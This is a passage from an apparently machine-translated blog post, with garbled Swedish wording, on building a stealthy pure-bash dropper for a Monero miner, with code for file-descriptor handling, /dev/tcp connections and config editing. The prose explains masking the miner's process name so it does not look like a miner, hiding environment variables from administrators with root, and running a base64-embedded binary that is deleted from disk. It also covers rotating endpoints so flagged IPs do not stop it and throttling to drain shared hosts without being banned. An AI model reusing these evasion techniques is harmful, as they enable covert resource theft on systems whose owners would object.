    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>Sova utan gaffel, genom att missbruka timeout -funktionen för den inbyggda inläsningen, använder den en dedikerad filbeskrivning och vi måste se till att den är tillgänglig för att undvika uppsägning.<p>Det finns funktioner som<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> används för att övervaka systemanvändning, dessa använder alla Linux<code>/proc</code> filer utan verktyg som<code>ps</code> , så ingen gaffel, allt rent bash.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>Coprocesses är tillgängliga sedan bash<code>v4</code> , de är som jobb förutom att de har ett namn och egna filbeskrivare.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>Vi skriver en demon, vilket är en långlivad process, och vi använder många filbeskrivare, vi vill verkligen göra några saneringar för att undvika att<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> ulimits</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>Denna funktion är beroende av<a href=https://ipinfo.io/> ipinfo</a> för att bestämma region för arbetaren, vilket gör det möjligt att ställa in någon regionberoende logik,<a href=\assets/posts/geoip.json> geoip.json</a> grupperar länder i regioner, eftersom vi vill ha toppnivåregionen och inte är intresserade av det specifika landet.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    <span class=hljs-built_in>timeout</span> 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>Bash har stöd för tcp -anslutningar, genom att ha en abstraktion över<code>/dev/tcp</code> (även för udp, men de flesta verkar oftast vara inaktiverade vid byggtiden, så du kan inte lita på det). Dessa filer är en bash sak, de är inte en del av Linux<code>/dev</code> träd.<p>Värt att nämna också ett låssystem för att hantera samtidighet mellan basjobb. För att flera jobb ska fungera med lås måste de alla dela en filbeskrivning, så vår<code>locker</code> som också är ett jobb, måste startas innan andra jobb som vill använda låset. Skåpet läser bara på<code>stdin</code> väntar på låsningsförfrågningar, svarar vidare<code>stdout</code> beroende på det aktuella booleska tillståndet som lagras i en variabel. Jag garanterar inte att detta tillvägagångssätt är rasfritt, men verkar fungera hyfsat, å andra sidan har jag funnit att filbeskrivare inte är särskilt tillförlitliga, eftersom jag misstänker att det finns några buffertar som inte spolas någonstans ner i<em> rör</em> och så småningom slå dödlägen (vilket innebär att du inte kan lita på att skåpet ger dig ett svar hela tiden).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>Rensa ditt skräp ... komplexa bash -program använder många variabler, och om du missbrukar det globala utrymmet blir det uppblåst. Om du gyter skaljobb, de ärver all miljö (som dupliceras effektivt, inte delas), du kan snabbt sluta med att äta<code>100M</code> av minne, inte trevligt. Vi vill också verkligen ha låg profil. I vårt installationsscenario, motståndaren<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> kan ha rotåtkomst och fullständig information om våra processer<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> , och du vet ... varje process innehåller information om det fullständiga kommandot som startade det och de exporterade miljövariablerna.<h2 id=configuration><a class=header-anchor href=#configuration> Konfiguration</a></h2><p>När vi väl har vår miljö och våra verktyg måste vi ställa in vår gruvarbetare för maskinen den körs på, konfigurationssteg i pseudokod:<ul><li><p>processnamn för gruvarbetaren<li><p>värdinformation (ram/kärnor/cacher/<code>ENV_VARS</code>)<li><p>konfigurationsversion<li><p><code>worker_id</code> för gruvarbetaren (från ip och värd)<li><p>ip/port för anslutningen</ul><p>Du måste välja ett namn för processen<em> Dölj</em> det faktum att vi driver en gruvarbetare, men vi byter inte bara namn på vår binär, vi har en lista över<strong> masker</strong> för potentiella kandidater (en vanlig textfil där varje rad är en mask):<ul><li><p>välj en mask slumpmässigt<li><p>blanda elementen i strängens svans (alla utom den första) för att få ett varierat processkommando. Nu har vi en sträng som ser ut<code>cmd --arg2 --arg1 --arg3</code> . Detta är vår gruvmask, vi kör det binära<em> utan</em> argument, men det ser ut som om vi startade ett kommando<code>cmd</code> med argument<code>--arg1 --arg2 --arg3</code> . Mellanslag och bindestreck är tillåtna i filnamn, så det är bra att köra en binär som heter så här, det verkar inte som Linux skiljer mellan den körbara och argumenten vid lagring av processkommandon.<p>Gruvkonfiguration laddas automatiskt från<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> Hashrate</a></h3><p>med tiden fick uppströms gruvarbetare många<strong> automatisk inställning</strong> funktioner, så det gjorde en del av mina skript överflödiga, men skillnaden mellan uppströms och nedströms här är att uppströms målet är att maximera<em> prestanda</em> , medan vårt mål är att maximera<em> effektivitet och förvirring</em> , vi vill inte köra om systemet, vi vill tömma lite utan störningar.<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>För detta behöver vi en mer detaljerad förståelse för miljön<code>l2/l3</code> cachestruktur för processor, ram och kärnor och nuvarande processor<em> genomsnitt</em> ladda och cpu<em> användande</em>. Jag försökte bygga en<a href=https://en.wikipedia.org/wiki/Finite-state_machine> statsmaskin</a> i bash som skulle utgå från det lägsta minimum och prova olika konfigurationer som långsamt nådde det genomsnittliga bästa. Det var en<strong> enorm</strong> slöseri med ansträngning<a href=https://en.wikipedia.org/wiki/Technical_debt> teknisk skuld</a> som gick i konkurs mycket snabbt och för det mesta kasserades, med bara rester kvar i kodbasen.<p>Frack all denna auto tuning jumbo, vi fick just gruvarbetaren att sova beroende på värdanvändning/belastning, detta krävde gruvarbetarmodifieringar för<code>sleep</code> mellan trådarnas avkastning och några korrigeringar av konfigurationsvakten<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> , vilket gör att vi kan ladda om sovmängden vid körning. Logiken är mycket mer förenklad och ser ut så här:<ul><li><p>om användningen är över/under $ TARGET_USAGE (± felmarginal) ökar/minskar sömnen<li><p>om genomsnittlig belastning inom<code>1m</code> är över/under $ TARGET_LOAD pausa/återuppta gruvdrift</ul><h3 id=connection><a class=header-anchor href=#connection> Förbindelse</a></h3><p>I vår bash roundup visade vi verktyg för anslutning. Varför behöver vi dessa? För att vi behöver mångfald; helt enkelt hård kodning av en slutpunkt i konfigurationen kommer inte att vara länge, när något ser misstänkt ut och har nätverksaktivitet flaggas IP -adresser.<p>I början experimenterade vi med ett par metoder:<ul><li><p>använder sig av<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> proxykedjor</a> för att överbelasta gruvarbetarnätverkets samtal, men det krävde att gruvarbetaren byggdes med dinamiska bibliotek, och du var tvungen att skicka dem med nyttolasten, så det var opraktiskt.<li><p>kör a<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> tunnel framåt</a> sida vid sida med gruvarbetaren: detta hade mycket konfigurationsomkostnader, eftersom vi nu konfigurerade två processer för varje distribution, vilket utgjorde fler buggar.</ul><p>I slutet avgjordes vi med att bara skicka en lista över slutpunkter, lagrade i bash -variabler och välja en slumpmässigt. Anslutningar var naturligtvis krypterade. Vilka är dessa slutpunkter? Speditörer till den proxy som skulle hantera gruvarbetarnas jobb.<p>Varför behöver vi en<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> gruvproxy</a> ? Jag gick aldrig riktigt förbi ~ 100 samtidiga anslutningar, så en proxy var inte riktigt nödvändig för nätverksbelastning, men det var bekvämt för att förhandla om haschalgoritmen och för att tillhandahålla olika svårighetsmål till olika gruvarbetare för att förhindra gruvarbetare att arbeta vidare<strong> svårighet</strong> mål som skulle ta dem för mycket tid att slutföra och undvika risken att slösa beräkning på oavslutade jobb.<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> Poolprogramvaran krävde också några ändringar eftersom det gärna annonserade för att vara en proxy på vanliga http -förfrågningar ...<em> som fick time-out</em> och en gaffel lade till åtkomstkontroll så vi baserade våra mods på det.<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> Redigerar json</a></h3><p>Genom att tillämpa ändringar på en json -fil med just bash klarade vi oss med lite env var -substitution och lite regex. Inledningsvis förlitade vi oss på en<code>envsubst</code> binärt för att tillämpa variabler, sedan gick vi helt bash<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> med denna logik:<ul><li><p>läs konfigurationsmall<li><p>ersätt alla citat med en mycket esoterisk sträng (som<code>_#_#</code>)<li><p><code>eval</code> mallen<li><p>ersätt alla esoteriska förekomster tillbaka med citat</ul><p>Förutom att undvika delprocesser är en annan fördel att vi får kompletta bash -funktioner i våra mallar. För att läsa och skriva utan mallar måste vi förlita oss på bash regex -funktioner:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>Detta tillåter oss bara att redigera enskilda rader, för flerradiga poster tar det bara hänsyn till den första raden..men det är tillräckligt bra för vårt användningsfall.<h2 id=runtime><a class=header-anchor href=#runtime> Körning</a></h2><p>Hur ser vår körtid ut? Vi har en huvudsaklig bash-process som kör huvudslingan, sedan gruvarbetarens delprocess, CPU-bildskärmens delprocess, skåpet och tunern. Det är nästan en handfull.<p>Först vill vi se till att om något går fel lämnar vi inte en röra, det betyder att vi använder en bash -fälla för att utföra saneringar vid avslutning<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> avlägsnar fällan för att förhindra rekursion. Fällan dödar alla jobb och tar bort arbetsmiljön.<p>Det är dags att starta gruvarbetaren, som lagras som en bash -variabel i base64 -kodning. Vi dumpar det på filsystemet, sedan dumpar vi konfigurationen, kör gruvarbetaren och tar bort både gruvarbetaren och konfigurationen. På linux kan du ta bort den körbara för en pågående process (i Windows är detta inte tillåtet).<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> När gruvarbetaren är igång finns det bara ett<code>.. /</code> katalog med en<code>b64</code> länk i den.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>En vansinnig egendom som möts av bash medan kodning av gruvarbetaren är att tilldela en variabel med en subshell med citat<code>myvar="$(something)"</code> orsakar en permanent ökning av minnesanvändningen, detta var svårt att felsöka och har inte riktigt hittat anledningen till att bete sig så här, i alla fall måste uppgiften vara offert. Avkodning görs istället med<em> herrings</em> som är en abstraktion över temporära filer, dumpas variabeln till en fil som sedan läggs tillbaka i processen.<p>Gruvarbetarens långa loop:<ul><li><p>medan det är sant<ul><li><p>sluta gruvarbetare<li><p>ta bort config<li><p>starta gruvarbetare<li><p>medan det är sant<ul><li><p>starta demon<ul><li><p>medan gruvarbetaren springer<ul><li><p>läs utdata från gruvarbetare<li><p>välj gruvarbetare baserat på utgångslinje</ul></ul><li><p>om gruvarbetaren inte körs: bryt</ul><li><p>sömn</ul></ul><p>Utgångslinjen matchas mot någon regex:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>Demonen hanterar fall där<ul><li><p>anslutningen till slutpunkten ger fel (välj en ny slumpmässig slutpunkt)<li><p>hash-algoritmen ändras (justera sömntid och ad-hoc-konfigurationer)<li><p>gruvarbetarproblem (starta om gruvarbetaren).</ul><p>Ett tag fanns stöd för kommandon och kontrollpanelen, som gjorde det möjligt att utlösa manuell omstart, men eftersom användningen var minimal kastades den och dess slutpunkter ersattes med en alternativ poolanslutning, även omstartsprocessen var instabil, komplex. ..en annan instans av teknisk skuld. Men det gjorde det möjligt att hämta en uppdaterad nyttolast och installera om alla konfigurationer direkt, vilket var ganska coolt, den ultimata studsmattan.<h2 id=debugging><a class=header-anchor href=#debugging> Felsökning</a></h2><p>Det finns tre huvudverktyg<ul><li><p>aktivera/inaktivera spårning kring kodblock (vi vill inte spåra en b64 -kodad binär i en variabel ..)<li><p>en enkel funktion för formatering av loggar<li><p>en flagga som skulle aktivera utförlig loggning vid körning när gruvarbetaren startades.<ul><li><p>gör filen<code>.debug</code> existera?<ul><li><p>aktivera utförlig loggning</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> Målutplaceringar</a></h2><p>Denna installation har testats på tre slags värdar:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> Självbaserade containrar eller virtuella datorer</a></h3><p>Många värdleverantörer gillar inte gruvdrift eftersom CPU -resurser tenderar att delas mellan flera användare, och gruvprogramvara kan enkelt bromsa en värdnod som påverkar prestanda för resten av användarna. Detta kan gälla även om CPU -användartiden är obegränsad, eftersom haschalgoritmer kan mätta alla cachlager i CPU: n om cacheminnet delas mellan alla CPU -kärnor.<p>Vi skulle vilja använda vår<em> rättvis</em> del av resurser utan att bli förbjuden, det är ett bra användningsfall för vår smygande dropper eftersom det är värdanvändning medveten, vilket betyder att det<em> skall</em> stanna inom [AUP]. Det finns inga extra steg när det 